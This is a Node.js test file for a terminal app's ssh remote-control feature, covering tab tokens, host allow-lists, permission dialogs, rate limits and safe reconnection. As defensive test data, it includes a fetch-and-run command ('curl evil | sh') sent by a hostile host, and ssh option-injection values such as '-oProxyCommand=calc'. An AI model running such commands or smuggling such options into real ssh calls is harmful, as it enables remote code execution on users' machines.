'use strict';
// Remote control over ssh in the model: who may open tabs, what gets started, the tab token, limits,
// reconnecting on load. A fake Session and a fake process list; no pty, no PowerShell.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { Model } = require('../src/main/model');
const { FakeSession } = require('./helpers/fake-session');
const R = require('../src/main/remote');

const SHELLS = {
  cmd: { label: 'Command Prompt', file: 'cmd.exe', args: [], env: {} },
  bash: { label: 'Git Bash', file: 'bash.exe', args: [], env: {} },
};
const SSH = 'C:\\Windows\\System32\\OpenSSH\\ssh.exe';
const GIT_SSH = 'C:\\Program Files\\Git\\usr\\bin\\ssh.exe';
const SEND_ENV = ['-t', '-o', 'SendEnv=LC_TERMINAL', '-o', 'SendEnv=LC_TERMINAL_VERSION', '-o', 'SendEnv=KOLONKA_TOKEN'];
const b = R.b64encode;
const tick = (ms = 0) => new Promise((r) => setTimeout(r, ms));

// procs() -> the fake process list
function makeModel(t, { dir, settings, procs, sshExe = () => SSH, allowedExe = (p) => p === SSH || p === GIT_SSH } = {}) {
  dir = dir || fs.mkdtempSync(path.join(os.tmpdir(), 'kolonka-remote-'));
  const calls = { list: 0 };
  const model = new Model({
    dataDir: dir, settings: Object.assign({ defaultShell: 'cmd' }, settings), shells: SHELLS, Session: FakeSession,
    remoteDeps: { listProcesses: async () => { calls.list++; return procs ? procs() : []; }, sshExe, isAllowedSshExe: allowedExe },
  });
  const logs = []; const notices = []; const events = []; const notes = []; const asked = [];
  model.on('log', (level, msg) => logs.push(msg));
  model.on('remote-notice', (n) => notices.push(n));
  model.on('event', (e) => events.push(e));
  model.on('notify', (n) => notes.push(n));
  t.after(() => { clearTimeout(model._saveTimer); fs.rmSync(dir, { recursive: true, force: true }); });
  // answer: what the dialog says (a value or a function of the request)
  const answer = (a) => { model.askRemote = async (req) => { asked.push(req); return typeof a === 'function' ? a(req) : a; }; };
  return { model, dir, calls, logs, notices, events, notes, asked, answer };
}

const sshUnder = (pid, line = '"C:\\Program Files\\Git\\usr\\bin\\ssh.exe" -p 2222 leo@myserver', exe = GIT_SSH) => [
  { pid, ppid: 1, name: 'bash.exe', started: 10 },
  { pid: pid + 1, ppid: pid, name: 'ssh.exe', cmd: line, exe, started: 20 },
];

// an OSC 7711 open as Kolonka parses it; token: the tab's own (true), none (null) or a string
function open(tab, fields, token = true) {
  const f = Object.assign({}, fields);
  if (token === true) f.token = tab.token; else if (typeof token === 'string') f.token = token;
  return R.parseRemoteOsc('open;' + Object.entries(f).map(([k, v]) => `${k}=${k === 'select' || k === 'rerun' ? v : b(v)}`).join(';'));
}

const sshTab = (model, dir, destination = 'myserver', extra = {}) =>
  model.createSession({ cwd: dir, ssh: Object.assign({ destination, options: [], cmd: '' }, extra) });

// ---------- open: token and allowHosts ----------

test('a verified open @same to an allowed host: a tab connected the same way, no question, rerun', async (t) => {
  let tab;
  const env = makeModel(t, { settings: { remote: { allowHosts: ['leo@myserver:2222'] } }, procs: () => sshUnder(tab.pid) });
  const { model } = env;
  tab = model.createSession({ cwd: env.dir, shell: 'bash' });
  env.answer('deny');
  const s = await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'cd ~/app && claude', name: 'agent' }));
  assert.equal(env.asked.length, 0);
  assert.equal(s.shellKey, 'ssh');
  assert.equal(s.opts.shell.file, GIT_SSH, 'the ssh.exe the tab used (it is on the allowed list)');
  assert.deepEqual(s.opts.shell.args, [...SEND_ENV, '-p', '2222', '--', 'leo@myserver', 'cd ~/app && claude']);
  assert.equal(s.opts.shell.commandLine, R.sshCommandLine(GIT_SSH, s.opts.shell.args), 'quoted by Kolonka for that ssh.exe');
  assert.equal(s.opts.runCommand, false, 'the command is an ssh argument, it is not typed');
  assert.equal(s.command, null);
  assert.equal(s.name, 'agent');
  assert.equal(s.nameFromServer, true);
  assert.equal(s.workspaceId, tab.workspaceId);
  assert.equal(s.rerun, true);
  assert.equal(s.fromRemote, true);
  assert.equal(s.remoteRoot, tab.id);
  assert.deepEqual(s.info().remote, { host: 'leo@myserver', cmd: 'cd ~/app && claude' });
  assert.equal(model.activeId, s.id, 'select=1 by default');
  const ev = env.events.find((e) => e.type === 'remote.opened');
  assert.deepEqual([ev.session, ev.created, ev.host, ev.verified, ev.rerun], [tab.id, s.id, 'leo@myserver:2222', true, true]);
  assert.ok(!JSON.stringify(env.events).includes(tab.token), 'the token is in no event');
  assert.ok(!env.logs.join('\n').includes(tab.token), 'nor in the log');
});

test('the server can ask not to reconnect (rerun=0)', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } } });
  const tab = sshTab(env.model, env.dir);
  const s = await env.model.handleRemote(tab, open(tab, { host: '@same', cmd: 'htop', rerun: '0' }));
  assert.equal(s.rerun, false);
});

test('without the tab\'s token, an allowed host still needs the dialog, and never "Always" or rerun', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } } });
  const { model } = env;
  const tab = sshTab(model, env.dir);
  env.answer('always'); // a dialog that offered no "Always" cannot return it; even if it did:
  for (const tok of [null, 'not-the-token', sshTab(model, env.dir).token]) {
    const s = await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'htop' }, tok));
    assert.ok(s, 'allowed once');
    assert.equal(s.rerun, false, 'not reconnected at startup');
  }
  assert.equal(env.asked.length, 3);
  assert.ok(env.asked.every((r) => r.verified === false));
  assert.deepEqual(model.remoteAllowed, [], 'nothing remembered');
});

test('the token vouches only for the tab\'s own server: another allowed host still asks', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['prod', 'evil'] } } });
  const { model } = env;
  const tab = sshTab(model, env.dir, 'evil');
  env.answer('deny');
  // evil knows the tab's token (it was sent there) and asks for a tab on prod
  assert.equal(await model.handleRemote(tab, open(tab, { host: 'prod', cmd: 'curl evil | sh' })), undefined);
  assert.equal(env.asked.length, 1);
  assert.equal(env.asked[0].verified, true, 'Always is offered: the token is right');
  assert.equal(env.asked[0].host, 'prod');
  // naming its own host explicitly is the same as @same
  model._denyUntil.delete(tab);
  assert.ok(await model.handleRemote(tab, open(tab, { host: 'evil', cmd: 'htop' })));
  assert.equal(env.asked.length, 1);
});

test('allowHosts is compared by the whole user@host:port', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['prod', 'leo@box'] } } });
  const { model } = env;
  env.answer('deny-tab');
  for (const [dest, opts, allowed] of [['prod', [], true], ['root@prod', [], false], ['prod', ['-p', '2222'], false], ['box', ['-l', 'leo'], true], ['box', [], false]]) {
    const tab = sshTab(model, env.dir, dest, { options: opts });
    const s = await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' }));
    assert.equal(!!s, allowed, `${dest} ${opts.join(' ')}`);
  }
});

test('open from a local tab (no ssh under it) is refused, with a notice; nothing is asked', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } }, procs: () => [{ pid: 1, ppid: 0, name: 'x' }] });
  const { model } = env;
  const tab = model.createSession({ cwd: env.dir });
  env.answer('once');
  const before = model.sessions.size;
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' }));
  await model.handleRemote(tab, open(tab, { host: 'myserver', cmd: 'ls' }));
  assert.equal(model.sessions.size, before);
  assert.equal(env.asked.length, 0);
  assert.deepEqual(env.notices.map((n) => n.reason), ['no-ssh', 'not-ssh']);
  assert.deepEqual(env.events.filter((e) => e.type === 'remote.denied').map((e) => e.reason), ['no-ssh', 'not-ssh']);
});

test('open from a local tab is allowed only with remote.fromLocalTabs, for a named host, and always asks', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'], fromLocalTabs: true } } });
  const { model } = env;
  const tab = model.createSession({ cwd: env.dir });
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' }));
  assert.equal(env.notices.pop().reason, 'no-ssh', '@same still needs an ssh connection');
  env.answer('once');
  const s = await model.handleRemote(tab, open(tab, { host: 'myserver', cmd: 'ls' }));
  assert.equal(env.asked.length, 1, 'a local tab is no server the token could vouch for');
  assert.deepEqual(s.opts.shell.args, [...SEND_ENV, '--', 'myserver', 'ls']);
  assert.equal(s.opts.shell.file, SSH);
});

test('@same with options Kolonka does not carry over (-o, -F …) is refused, not made without them', async (t) => {
  let tab;
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } }, procs: () => sshUnder(tab.pid, 'ssh -o ProxyJump=bastion -F x myserver', SSH) });
  tab = env.model.createSession({ cwd: env.dir });
  env.answer('once');
  assert.equal(await env.model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' })), undefined);
  const n = env.notices.pop();
  assert.equal(n.reason, 'ssh-options');
  assert.deepEqual(n.options, ['-o', '-F']);
  assert.equal(env.asked.length, 0);
});

test('an ssh.exe that is not on the allowed list is not used for the new tab', async (t) => {
  let tab;
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } }, procs: () => sshUnder(tab.pid, 'ssh myserver', 'C:\\Users\\x\\Downloads\\ssh.exe') });
  tab = env.model.createSession({ cwd: env.dir });
  const s = await env.model.handleRemote(tab, open(tab, { host: '@same' }));
  assert.equal(s.opts.shell.file, SSH);
  assert.equal(s.ssh.exe, undefined);
  assert.deepEqual(s.opts.shell.unsetEnv, ['MSYS', 'CYGWIN'], 'for every ssh tab, not only Git\'s');
});

test('the tab\'s own server named explicitly is treated as @same: its -J and ssh.exe are kept', async (t) => {
  let tab;
  const env = makeModel(t, { settings: { remote: { allowHosts: ['internal'] } }, procs: () => sshUnder(tab.pid, 'ssh -J bastion internal', GIT_SSH) });
  tab = env.model.createSession({ cwd: env.dir });
  env.answer('deny');
  const s = await env.model.handleRemote(tab, open(tab, { host: 'internal', cmd: 'htop' }));
  assert.equal(env.asked.length, 0, 'same host, right token, allowed: no question');
  assert.deepEqual(s.opts.shell.args, [...SEND_ENV, '-J', 'bastion', '--', 'internal', 'htop'], 'not a direct ssh internal');
  assert.equal(s.opts.shell.file, GIT_SSH);
});

test('IPv6 with a port: a named host that only looks like the tab\'s own is not "same"', async (t) => {
  let tab;
  const env = makeModel(t, { settings: { remote: { allowHosts: ['leo@[2001:db8::1]:2222', 'leo@[2001:db8::1:2222]'] } }, procs: () => sshUnder(tab.pid, 'ssh -p 2222 leo@2001:db8::1', SSH) });
  tab = env.model.createSession({ cwd: env.dir });
  env.answer('deny');
  assert.equal(await env.model.handleRemote(tab, open(tab, { host: 'leo@2001:db8::1:2222', cmd: 'x' })), undefined);
  assert.equal(env.asked.length, 1, 'another address: asked');
  assert.equal(env.asked[0].host, 'leo@[2001:db8::1:2222]');
  env.model._denyUntil.delete(tab);
  const s = await env.model.handleRemote(tab, open(tab, { host: '@same', cmd: 'x' }));
  assert.ok(s, '@same: the tab\'s own server, allowed');
  assert.equal(env.asked.length, 1);
  env.model.allowRemoteHost('root@[2001:db8::2]:22');
  assert.ok(env.model.remoteAllowed.includes('root@[2001:db8::2]:22'), 'bracketed keys can be remembered');
});

test('Git\'s ssh.exe is started without MSYS / CYGWIN in its environment (MSYS=noglob changes how it reads quotes)', (t) => {
  const env = makeModel(t);
  const s = sshTab(env.model, env.dir, 'myserver', { exe: GIT_SSH });
  assert.equal(s.opts.shell.file, GIT_SSH);
  assert.deepEqual(s.opts.shell.unsetEnv, ['MSYS', 'CYGWIN']);
  assert.equal(s.opts.shell.commandLine, R.sshCommandLine(GIT_SSH, s.opts.shell.args));
});

test('no ssh.exe Kolonka may start at load or restart: the tab is not started, nothing is looked up on PATH', (t) => {
  const env = makeModel(t, { sshExe: () => null });
  fs.writeFileSync(path.join(env.dir, 'state.json'), JSON.stringify({ version: 1, counters: { w: 1, s: 3 }, workspaces: [{ id: 'w1', name: 'main', sessions: [
    { id: 's1', name: 'a', cwd: env.dir, shell: 'ssh', rerun: true, ssh: { destination: 'myserver', options: [], cmd: '' } },
  ] }] }));
  env.model.load();
  const s = env.model.sessions.get('s1');
  assert.equal(s.opts.shell.file, null);
  assert.equal(s.deferred, true);
  assert.ok(env.logs.some((l) => /no ssh\.exe to start/.test(l)));
  const r = env.model.restartSession('s1');
  assert.equal(r.opts.shell.file, null);
  assert.equal(r.deferred, true);
});

// ---------- the dialog ----------

test('the dialog: deny blocks the tab for 10 minutes, deny-tab for good, once opens, always remembers the whole key', async (t) => {
  let tab;
  const env = makeModel(t, { procs: () => sshUnder(tab.pid, 'ssh -l leo 100.64.1.2', SSH) });
  const { model } = env;
  tab = model.createSession({ cwd: env.dir, shell: 'bash' });
  const n0 = model.sessions.size;

  env.answer('deny');
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'htop' }));
  assert.equal(model.sessions.size, n0);
  const r = env.asked[0];
  assert.deepEqual([r.host, r.cmd, r.from, r.same, r.verified, r.name, r.session], ['leo@100.64.1.2', 'htop', 'leo@100.64.1.2', true, true, tab.name, tab.id]);
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'htop' }));
  assert.equal(env.asked.length, 1, 'blocked after Deny: not asked again');
  assert.ok(env.logs.some((l) => /denied before/.test(l)));

  model._denyUntil.set(tab, Date.now() - 1); // ten minutes later
  env.answer('once');
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'htop' }));
  assert.equal(model.sessions.size, n0 + 1);
  assert.deepEqual(model.remoteAllowed, [], 'once is not remembered');

  env.answer('always');
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'htop' }));
  assert.deepEqual(model.remoteAllowed, ['leo@100.64.1.2']);
  const asked = env.asked.length;
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'top' }));
  assert.equal(env.asked.length, asked, 'not asked again for that host');
  assert.equal(model.sessions.size, n0 + 3);

  // remembered across a restart of Kolonka, in state.json; the token is not saved
  model.saveNow();
  const raw = fs.readFileSync(path.join(env.dir, 'state.json'), 'utf8');
  assert.ok(!raw.includes(tab.token));
  const again = makeModel(t, { dir: env.dir });
  again.model.load();
  assert.deepEqual(again.model.remoteAllowed, ['leo@100.64.1.2']);

  const other = sshTab(model, env.dir, 'elsewhere');
  env.answer('deny-tab');
  await model.handleRemote(other, open(other, { host: '@same' }));
  model._denyUntil.get(other) === Infinity || assert.fail('deny-tab blocks for good');
});

test('requests that waited in the queue behind an "Always" are still asked about', async (t) => {
  const env = makeModel(t);
  const { model } = env;
  const tab = sshTab(model, env.dir, 'myserver');
  let release;
  const gate = new Promise((r) => { release = r; });
  env.answer(async (req) => { if (env.asked.length === 1) { await gate; return 'always'; } return 'once'; });
  const p1 = model.handleRemote(tab, open(tab, { host: '@same', cmd: 'one' }));
  const p2 = model.handleRemote(tab, open(tab, { host: '@same', cmd: 'two' }));
  await tick(10);
  release();
  await Promise.all([p1, p2]);
  assert.deepEqual(env.asked.map((r) => r.cmd), ['one', 'two']);
});

test('without a window to ask in, an unknown host is refused (and the tab is not blocked)', async (t) => {
  const env = makeModel(t);
  const tab = sshTab(env.model, env.dir);
  const n0 = env.model.sessions.size;
  await env.model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' }));
  assert.equal(env.model.sessions.size, n0);
  assert.equal(env.events.find((e) => e.type === 'remote.denied').reason, 'denied');
  assert.equal(env.model._denyUntil.get(tab), undefined);
});

test('a name set by the server is not shown as the tab\'s name in the dialog', async (t) => {
  const env = makeModel(t);
  const tab = sshTab(env.model, env.dir);
  await env.model.handleRemote(tab, R.parseRemoteOsc(`rename;name=${b('Your bank')}`));
  env.answer('deny');
  await env.model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' }));
  assert.equal(env.asked[0].name, null);
});

test('a named host from an ssh tab is asked about with both hosts, and opened without carried options', async (t) => {
  let tab;
  const env = makeModel(t, { procs: () => sshUnder(tab.pid) });
  const { model } = env;
  tab = model.createSession({ cwd: env.dir });
  env.answer('once');
  const s = await model.handleRemote(tab, open(tab, { host: 'otherbox', cmd: 'uptime', ws: 'Today', select: '0' }));
  const req = env.asked[0];
  assert.equal(req.from, 'leo@myserver:2222');
  assert.equal(req.host, 'otherbox');
  assert.equal(req.same, false);
  assert.deepEqual(s.opts.shell.args, [...SEND_ENV, '--', 'otherbox', 'uptime']);
  assert.equal(model.ws(s.workspaceId).name, 'Today', 'a new workspace by name');
  assert.notEqual(model.activeId, s.id, 'select=0');
  const s2 = await model.handleRemote(tab, open(tab, { host: 'otherbox', cmd: 'w', ws: 'today' }));
  assert.equal(s2.workspaceId, s.workspaceId, 'an existing workspace, by name in any case');
});

test('a tab opened over ssh asks for @same: its own connection, the process list is not read', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['leo@myserver'] } } });
  const { model, calls } = env;
  const first = sshTab(model, env.dir, 'leo@myserver', { options: ['-i', 'C:\\k\\id'], cmd: 'tmux' });
  const s = await model.handleRemote(first, open(first, { host: '@same', cmd: 'htop' }));
  assert.equal(calls.list, 0);
  assert.deepEqual(s.opts.shell.args, [...SEND_ENV, '-i', 'C:\\k\\id', '--', 'leo@myserver', 'htop']);
  assert.notEqual(s.token, first.token, 'each tab has its own token');
});

test('one process list serves the requests close in time', async (t) => {
  const tabs = [];
  const env = makeModel(t, { settings: { remote: { allowHosts: ['leo@myserver:2222'] } }, procs: () => tabs.flatMap((x) => sshUnder(x.pid)) });
  for (let i = 0; i < 3; i++) tabs.push(env.model.createSession({ cwd: env.dir }));
  await Promise.all(tabs.map((x) => env.model.handleRemote(x, open(x, { host: '@same' }))));
  assert.equal(env.calls.list, 1);
});

// ---------- limits ----------

test('more than 10 opens a minute from a tab and the tabs it opened are dropped, with log lines', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } } });
  const { model } = env;
  const tab = sshTab(model, env.dir);
  const opened = [];
  for (let i = 0; i < 5; i++) opened.push(await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'echo ' + i })));
  // the opened tabs ask too: they spend the budget of the first one
  for (const child of opened) await model.handleRemote(child, open(child, { host: '@same', cmd: 'x' }));
  const third = await model.handleRemote(opened[0], open(opened[0], { host: '@same', cmd: 'y' }));
  assert.equal(third, undefined, 'the 11th request of the chain');
  assert.ok(env.logs.some((l) => /dropped: more than 10 a minute/.test(l)));
  // a flood is not logged line by line: at most 5 lines a minute per tab
  for (let i = 0; i < 50; i++) await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'x' }));
  assert.equal(env.logs.filter((l) => new RegExp(`from ${tab.id} dropped`).test(l)).length, 5);
});

test('at most 20 opens a minute in the whole app', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'], maxTabs: 100 } } });
  let n = 0;
  for (let i = 0; i < 5; i++) {
    const tab = sshTab(env.model, env.dir);
    for (let j = 0; j < 5; j++) if (await env.model.handleRemote(tab, open(tab, { host: '@same' }))) n++;
  }
  assert.equal(n, 20);
  assert.ok(env.logs.some((l) => /more than 20 a minute in all tabs/.test(l)));
});

test('at most remote.maxTabs live tabs opened by servers', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'], maxTabs: 2 } } });
  const tab = sshTab(env.model, env.dir);
  const a = await env.model.handleRemote(tab, open(tab, { host: '@same' }));
  await env.model.handleRemote(tab, open(tab, { host: '@same' }));
  assert.equal(await env.model.handleRemote(tab, open(tab, { host: '@same' })), undefined);
  assert.equal(env.notices.pop().reason, 'too-many');
  a.emitExit(0); // an ended one does not count
  assert.ok(await env.model.handleRemote(tab, open(tab, { host: '@same' })));
});

test('remote.enabled: false ignores everything', async (t) => {
  const env = makeModel(t, { settings: { remote: { enabled: false, allowHosts: ['myserver'] } } });
  const { model } = env;
  const tab = sshTab(model, env.dir);
  const n0 = model.sessions.size;
  await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'x' }));
  await model.handleRemote(tab, R.parseRemoteOsc('status;state=blocked'));
  await model.handleRemote(tab, R.parseRemoteOsc(`notify;text=${b('hi')}`));
  assert.equal(model.sessions.size, n0);
  assert.equal(tab.status, 'idle');
  assert.deepEqual(env.notes, []);
});

test('no ssh.exe: refused with a notice', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } }, sshExe: () => null });
  const tab = sshTab(env.model, env.dir);
  await env.model.handleRemote(tab, open(tab, { host: '@same' }));
  assert.equal(env.notices.pop().reason, 'no-ssh-exe');
});

test('the OSC reaches the model through the session\'s "remote" event; a malformed one is only logged', async (t) => {
  const env = makeModel(t);
  const tab = env.model.createSession({ cwd: env.dir });
  tab.emit('remote', R.parseRemoteOsc('status;state=blocked'));
  assert.equal(tab.status, 'blocked');
  tab.emit('remote', R.parseRemoteOsc('open;host=***'));
  await tick();
  assert.ok(env.logs.some((l) => /ignored a remote control sequence/.test(l)));
});

// ---------- status / rename / notify ----------

test('status, rename and notify need no permission, from any tab', async (t) => {
  const env = makeModel(t);
  const { model } = env;
  const tab = model.createSession({ cwd: env.dir });
  await model.handleRemote(tab, R.parseRemoteOsc('status;state=blocked'));
  assert.equal(tab.status, 'blocked');
  assert.ok(env.events.some((e) => e.type === 'session.status' && e.status === 'blocked'));
  await model.handleRemote(tab, R.parseRemoteOsc(`rename;name=${b('build\x1b]0;x\x07 server')}`));
  assert.equal(tab.name, 'build ]0;x server');
  await model.handleRemote(tab, R.parseRemoteOsc(`notify;title=${b('CI')};text=${b('green')}`));
  assert.deepEqual(env.notes, [{ title: 'CI', text: 'green', session: tab.id }]);
  assert.ok(env.events.some((e) => e.type === 'session.notify' && e.session === tab.id && e.text === 'green'));
  await model.handleRemote(tab, R.notifyFromOsc9('osc nine'));
  await model.handleRemote(tab, R.notifyFromOsc777('notify;T;osc 777'));
  assert.deepEqual(env.notes.slice(1).map((n) => n.text), ['osc nine', 'osc 777']);
});

test('notifications and status changes: at most 10 a minute per tab; a repeated status costs nothing', async (t) => {
  const env = makeModel(t);
  const tab = env.model.createSession({ cwd: env.dir });
  for (let i = 0; i < 15; i++) await env.model.handleRemote(tab, R.notifyFromOsc9('n' + i));
  assert.equal(env.notes.length, 10);
  const changes = () => env.events.filter((e) => e.type === 'session.status').length;
  for (let i = 0; i < 30; i++) await env.model.handleRemote(tab, R.parseRemoteOsc('status;state=active'));
  assert.equal(changes(), 1, '30 repeats of one state: one change');
  for (let i = 0; i < 15; i++) await env.model.handleRemote(tab, R.parseRemoteOsc('status;state=' + (i % 2 ? 'active' : 'blocked')));
  assert.equal(changes(), 10, 'then 9 more changes, the rest dropped');
});

// ---------- load: what reconnects ----------

function writeState(dir, sessions) {
  fs.writeFileSync(path.join(dir, 'state.json'), JSON.stringify({
    version: 1, counters: { w: 1, s: 9 }, workspaces: [{ id: 'w1', name: 'main', sessions }],
  }));
}

test('load: only ssh tabs marked rerun connect; the others wait for Enter; other commands as before', (t) => {
  const env = makeModel(t);
  writeState(env.dir, [
    { id: 's1', name: 'agent', cwd: env.dir, shell: 'ssh', rerun: true, fromRemote: true, ssh: { destination: 'leo@myserver', options: ['-p', '2222'], cmd: 'claude', exe: GIT_SSH } },
    { id: 's2', name: 'dev', cwd: env.dir, shell: 'cmd', command: 'npm run dev' },
    { id: 's3', name: 'watch', cwd: env.dir, shell: 'cmd', command: 'npm run watch', rerun: true },
    { id: 's4', name: 'evil', cwd: env.dir, shell: 'ssh', ssh: { destination: 'x', options: ['-o', 'ProxyCommand=calc'] } },
    { id: 's5', name: 'once', cwd: env.dir, shell: 'ssh', fromRemote: true, ssh: { destination: 'myserver', options: [], cmd: 'htop', exe: 'C:\\Users\\x\\Downloads\\ssh.exe' } },
  ]);
  env.model.load();
  const s1 = env.model.sessions.get('s1');
  assert.equal(s1.opts.shell.file, GIT_SSH, 'a saved ssh.exe on the allowed list is kept');
  assert.deepEqual(s1.opts.shell.args, [...SEND_ENV, '-p', '2222', '--', 'leo@myserver', 'claude']);
  assert.equal(s1.rerun, true);
  assert.equal(s1.deferred, false);
  assert.equal(s1.fromRemote, true);
  assert.equal(env.model.sessions.get('s2').opts.runCommand, false, 'restore: fresh (default)');
  assert.equal(env.model.sessions.get('s3').opts.runCommand, true, 'rerun: true');
  const s4 = env.model.sessions.get('s4');
  assert.equal(s4.ssh, null, 'a saved ssh spec with -o is not trusted');
  assert.equal(s4.shellKey, 'cmd');
  const s5 = env.model.sessions.get('s5');
  assert.equal(s5.deferred, true, 'allowed once: not connected on its own');
  assert.equal(s5.exited, true);
  assert.equal(s5.opts.shell.file, SSH, 'a saved ssh.exe off the allowed list is replaced');
  // Enter (restart) connects it
  const r = env.model.restartSession('s5');
  assert.equal(r.deferred, false);
  assert.deepEqual(r.opts.shell.args, s5.opts.shell.args);
});

test('load with "restore": "rerun": every tab with a command runs it, ssh tabs connect', (t) => {
  const env = makeModel(t, { settings: { restore: 'rerun' } });
  writeState(env.dir, [
    { id: 's1', name: 'dev', cwd: env.dir, shell: 'cmd', command: 'npm run dev' },
    { id: 's2', name: 'sh', cwd: env.dir, shell: 'cmd' },
    { id: 's3', name: 'ssh', cwd: env.dir, shell: 'ssh', ssh: { destination: 'myserver', options: [], cmd: 'htop' } },
  ]);
  env.model.load();
  assert.equal(env.model.sessions.get('s1').opts.runCommand, true);
  assert.equal(env.model.sessions.get('s2').opts.runCommand, false);
  assert.equal(env.model.sessions.get('s3').deferred, false);
});

test('save + load round trip of an ssh tab; restart reconnects with the same arguments and a new token', (t) => {
  const env = makeModel(t);
  env.model.load();
  const s = env.model.createSession({ cwd: env.dir, rerun: true, ssh: { destination: 'myserver', options: ['-4'], cmd: 'tmux new -A -s main', exe: SSH } });
  const saved = env.model.serialize().workspaces[0].sessions.find((x) => x.id === s.id);
  assert.deepEqual(saved.ssh, { destination: 'myserver', options: ['-4'], cmd: 'tmux new -A -s main', exe: SSH });
  assert.equal(saved.rerun, true);
  assert.equal(saved.command, undefined);
  assert.ok(!JSON.stringify(env.model.serialize()).includes(s.token), 'no token in state.json');
  assert.ok(!JSON.stringify(env.model.tree()).includes(s.token), 'nor in the tree');
  const r = env.model.restartSession(s.id);
  assert.notEqual(r, s);
  assert.deepEqual(r.opts.shell.args, s.opts.shell.args);
  assert.equal(r.rerun, true);
  assert.notEqual(r.token, s.token);
});

test('the chain a tab opened by a server belongs to survives a restart of Kolonka', async (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } } });
  env.model.load();
  const tab = sshTab(env.model, env.dir);
  const child = await env.model.handleRemote(tab, open(tab, { host: '@same' }));
  env.model.saveNow();
  const again = makeModel(t, { dir: env.dir, settings: { remote: { allowHosts: ['myserver'] } } });
  again.model.load();
  assert.equal(again.model.sessions.get(child.id).remoteRoot, tab.id);
  assert.equal(again.model.sessions.get(child.id).fromRemote, true);
});

test('createSession refuses an ssh spec with unsafe options (the HTTP API passes it through)', (t) => {
  const env = makeModel(t);
  assert.throws(() => env.model.createSession({ cwd: env.dir, ssh: { destination: 'myserver', options: ['-F', 'x'] } }), /ssh/);
  assert.throws(() => env.model.createSession({ cwd: env.dir, ssh: { destination: '-oProxyCommand=calc' } }), /ssh/);
  const s = env.model.createSession({ cwd: env.dir, ssh: { destination: 'myserver', fromRemote: true }, fromRemote: true });
  assert.equal(s.fromRemote, false, 'only a remote open marks a tab as opened by a server');
});

test('allowHosts from settings and forgetting a remembered host', (t) => {
  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } } });
  const { model } = env;
  assert.ok(model.remoteHostAllowed('myserver'));
  assert.ok(!model.remoteHostAllowed('leo@myserver'));
  model.allowRemoteHost('other:2222');
  assert.ok(model.remoteHostAllowed('other:2222'));
  assert.equal(model.forgetRemoteHost('OTHER:2222'), true);
  assert.ok(!model.remoteHostAllowed('other:2222'));
  assert.equal(model.forgetRemoteHost('myserver'), false, 'a settings.json entry is not forgotten here');
});
